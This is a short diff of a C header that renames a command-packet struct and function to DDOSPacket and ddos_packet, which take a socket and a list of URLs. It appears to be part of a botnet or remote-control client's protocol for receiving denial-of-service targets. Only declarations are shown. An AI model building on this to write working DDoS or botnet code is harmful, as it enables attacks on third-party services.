@@ -23,10 +23,10 @@ typedef struct {
     uint8_t type;
     uint8_t c_type;
     uint8_t crc;
-    char command[];
-} CommandPacket;
+    char urls[];
+} DDOSPacket;
 #pragma pack(pop)
 
-int command_packet(SOCKET sock, uint8_t c_type, const char *command);
+int ddos_packet(SOCKET sock, const char *urls);
 
 #endif
